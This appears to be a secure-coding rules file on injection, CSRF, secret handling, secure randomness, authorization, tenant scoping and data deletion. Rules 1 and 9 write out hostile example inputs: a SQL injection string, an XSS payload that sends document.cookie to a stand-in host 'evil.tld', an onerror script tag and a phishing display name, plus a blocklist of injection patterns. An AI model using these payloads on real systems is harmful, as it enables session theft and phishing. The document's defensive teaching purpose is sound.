# security

Governs auth, permissions, input validation, secrets, and user data — in scope whenever a
slice touches any of those, not on every slice. Applies regardless of language, framework, or
datastore.

## Rule 1: Prevent injection at every layer

Untrusted input becomes a command, a query, or markup only if some layer along the way trusts
it. A field that reaches a shell command, a SQL string, or a DOM sink without going through a
parameterized or escaping API is an injection vulnerability, whatever validated it upstream.
Defense in depth means the backend re-checks what the frontend already checked, and the
database layer (constraints, parameterization) backs up the backend — one broken layer must
not be the only thing standing between an attacker and the data.

```
DON'T: query(`SELECT * FROM users WHERE id = ${id}`)
DO:    query('SELECT * FROM users WHERE id = ?', [id])
```

A request for `id = "1 OR 1=1"` or a name of `<script>document.location='evil.tld/'+document.cookie</script>`
must fail the same way regardless of which layer sees it first. Grant each layer only the
permissions it needs to do its job — a component that only reads must not hold write access.

## Rule 2: Defend state-changing endpoints against CSRF

A browser attaches cookies to a request automatically, including one triggered by a form or
script on a completely different site — so a cookie proves the request came from the user's
browser, not that the user meant to make it. Any endpoint that changes state (create, update,
delete) and authenticates purely off a session cookie must not treat a well-formed, cookie-
bearing request as trustworthy on its own: pair it with a synchronizer or double-submit CSRF
token, or with `SameSite=Lax`/`Strict` on the session cookie plus an explicit origin/referer
check. This is a different failure than Rule 1's injection — the payload here is entirely
well-formed, the attacker just forges the request and rides the victim's ambient session. An
endpoint authenticated by a bearer token in an `Authorization` header isn't exposed this way,
since a cross-site page can't read or attach that header; this rule applies specifically to
cookie-based auth.

## Rule 3: Never hardcode secrets

API keys, passwords, tokens, JWT signing secrets, database credentials, OAuth secrets,
encryption keys, and webhook secrets must never appear as string literals in code. A secret
committed once is compromised forever — it stays in history even after deletion, and anyone
with repo access (including a fork, a CI log, or a leaked build artifact) has it. All secrets
come from the runtime environment or a secrets manager, read at startup, never typed inline.

```
DON'T: const client = new Client({ apiKey: "sk_live_51H8x..." })
DO:    const client = new Client({ apiKey: getSecret("PAYMENTS_API_KEY") })
```

## Rule 4: Never fall back to a default for a missing secret

A missing secret must crash the app, not silently substitute a placeholder. A fallback like
`secret || 'default'` means every environment that forgets to set the real value — including,
eventually, production — runs with a credential every developer and every leaked `.env.example`
already knows. Fail fast at startup instead: read the secret once, throw if it's undefined, and
let the deploy fail loudly rather than run insecurely.

```
DON'T: const jwtSecret = process.env.JWT_SECRET || 'dev-secret'
DO:    const jwtSecret = process.env.JWT_SECRET
       if (!jwtSecret) throw new Error('JWT_SECRET is required')
```

## Rule 5: Never let secrets reach version control

Environment files that hold real values (`.env`, `.env.local`, `.env.production`, and
equivalents) must be excluded from version control before the first commit that could contain
one. Only a template with placeholder values is ever committed. A secret that lands in a commit
is compromised the moment that commit is pushed, whether or not the file is later removed — the
fix is a full credential rotation, not a follow-up commit deleting the file.

## Rule 6: Use cryptographically secure randomness for security-sensitive values

A non-cryptographic random generator (most languages' default `random()`) is a pseudo-random
sequence seedable or predictable enough to be guessed by an attacker who samples enough outputs
— it must never produce a one-time password, session ID, password-reset token, or API key.
Use the platform's cryptographic RNG for anything that gates access. A default random generator
is fine for a UI shuffle or an animation delay — nothing that, if guessed, grants entry.

```
DON'T: const otp = Math.floor(Math.random() * 1_000_000)
DO:    const otp = secureRandomInt(0, 999_999)   // CSPRNG-backed
```

## Rule 7: Validate and sanitize every input on the server

Client-side validation is a UX convenience, never a security control — it runs in an
environment the attacker fully controls and can be bypassed by calling the API directly. Every
field an endpoint accepts must be validated and sanitized again on the backend, using the same
rules the frontend applies (ideally from one shared definition, so the two never drift).
Normalize before validating: trim whitespace from every text input before checking it, since
autocomplete and mobile keyboards routinely append trailing spaces that would otherwise fail an
exact-match check or slip past a blocklist.

## Rule 8: Normalize identifiers that gate trust or uniqueness

A field used to deduplicate accounts, rate-limit signups, or decide who to trust (email being
the common case) must be validated for structure, normalized to one canonical form before
storage, and checked against known evasion patterns — alias variants of the same address
(`user+promo@domain.tld`, dot-insertion tricks) must resolve to the same identity, or an
attacker creates unlimited accounts from one mailbox; where the identifier gates trust or a
rate limit, it should also reject known disposable-email domains at signup, since normalization
alone doesn't stop an attacker with an unlimited supply of throwaway addresses. This kind of
normalization only makes sense on the backend — the canonical form is a security decision, not
a display concern.

## Rule 9: Sanitize free text against link and markup injection

A plain-text field (a display name, a bio, a comment) that later gets rendered somewhere links
auto-linkify, or markup executes, is an injection vector even though it never touches a
database query. An attacker sets their display name to `Reset your password: http://evil.tld/`
or `<img src=x onerror=alert(1)>` and waits for it to render in another user's view or inbox.
Reject raw URLs (`http://`, `https://`, `www.`) and markup-injection patterns (`<script`,
`onclick=`, `javascript:`, `data:`) in fields that are not supposed to carry them, collapse
repeated whitespace, and enforce a length limit — an unbounded name field is a storage and
rendering liability on its own.

## Rule 10: Re-sanitize user data before it enters outbound trusted-channel content

Data that passed input validation is not automatically safe to place inside content your system
sends on your own authority — a transactional email, a push notification, a PDF. An attacker
who signs up with a display name containing a disguised link relies on the recipient's client
auto-linking it, and on the message arriving from a domain the recipient already trusts, which
makes the resulting phishing link more convincing than one sent directly. Sanitize again at the
point of inclusion, independent of whatever check ran at signup, and prefer plain text over HTML
for outbound content that embeds user-supplied strings.

## Rule 11: Keep long-lived credentials out of persistent client-side storage

A token stored anywhere a script on the page can read it (persistent browser storage, a
non-HTTP-only cookie) is a token any successful XSS on that page can exfiltrate. Short-lived
access tokens belong in memory only; a longer-lived refresh token belongs in storage the page's
own JavaScript cannot read (an HTTP-only cookie on web, secure OS-level storage on mobile).
Losing the access token to a page reload is an acceptable cost — the refresh flow gets it back;
losing it to a stolen script is not.

## Rule 12: Size credential lifetime to data sensitivity

A long-lived access token widens the exposure window if it leaks — the longer it's valid, the
longer a compromised token keeps working before it expires on its own. Low-sensitivity,
consumer-facing data can tolerate access tokens valid for weeks. An application handling
financial data, health data, or other PII-heavy records should issue access tokens valid for
minutes, not days, and require the refresh flow to run far more often. Pick the lifetime the
data being protected deserves, not a default carried over from a different kind of app.

## Rule 13: Authorize every resource access against the requester

Loading a resource by ID and returning it is not the same as verifying the requester is allowed
to see it. Every handler that accepts a resource identifier must check the authenticated
caller's relationship to that specific resource before acting — not just that the caller is
logged in, but that this resource is theirs, or that their role permits this action on it. A
request for `/orders/482` must fail for a logged-in user who isn't party to order 482, not
succeed because the ID was well-formed and the caller had a valid session.

## Rule 14: Match the failure mode to the operation

A read that fails authorization should look identical to a read that found nothing — return an
empty result, not an "unauthorized" error, or an attacker can enumerate valid IDs by watching
which ones produce a different error than a nonexistent one. A write that fails authorization
should do the opposite: return an explicit, actionable error, because the caller who owns
nothing to compare against needs to know the action didn't happen. Silently succeeding on a
denied write is as dangerous as leaking existence on a denied read — the caller with no
feedback assumes the action worked.

## Rule 15: Derive related identifiers server-side instead of trusting redundant client input

When an API accepts an identifier that already implies a second one (a resource ID that belongs
to exactly one parent), never also accept that parent ID as separate client input and trust it.
A client that sends a resource ID from one parent alongside a parent ID for a different one
creates a mismatch the server must now detect instead of never allow — derive the parent from
the resource server-side and validate the actual relationship, which removes the mismatch class
of bug entirely rather than adding a check for it.

## Rule 16: Scope every query to the authenticated tenant

In any system where data belongs to a tenant, account, or group, every query that returns
tenant data must filter by the authenticated caller's own tenant — never by a tenant ID
supplied in the request, and never by omission on the assumption that "my data" queries are
inherently safe. A user who edits a request to reference another tenant's identifier must be
blocked by a server-side scope check, not merely fail to find a link to make the request in the
UI. Prefer explicit tenant-scoped queries over an implicit "current user's data" cache key, so
one session's cached data can never leak into another's.

## Rule 17: Exclude soft-deleted records from normal reads

A table that supports soft delete needs its "deleted" filter applied at every read site, not
only the ones written after the feature existed — a query that forgets it returns records the
product already told the user were gone. Treat the filter as part of the table's normal query
shape, not an opt-in condition, and reserve the unfiltered view for admin or recovery tooling
that explicitly needs it.

## Rule 18: Match deletion depth and timeline to legal requirement and data sensitivity

Deleting an account is not the same obligation as deleting one piece of content. Where the law
grants a right to erasure, account deletion must remove the user's data immediately and
completely — a soft delete that keeps rows around "just in case" does not satisfy it. Ordinary
content deletion can use a soft delete with a bounded recovery window, but a scheduled job must
actually purge those records once the window closes, or "temporary" retention becomes
indefinite retention by neglect. Data belonging to a minor gets the stricter end of both axes:
collection requires verified consent up front, and deletion — whether by account closure or by
the routine recovery window — must not leave that data recoverable longer than an adult's would
be.

## Not this

- Validating on the frontend and trusting that check on the backend.
- A cookie-authenticated, state-changing endpoint with no CSRF token and no SameSite/origin check.
- `secret || 'fallback'` — any default value for something that must be secret.
- `Math.random()` behind a token, OTP, session ID, or password reset link.
- An "unauthorized" error on a read endpoint, or a silent no-op on a denied write.
- An access token sitting in `localStorage` or a plain (non-HTTP-only) cookie.
- A tenant-scoped query that trusts a client-supplied tenant ID instead of the session's own.
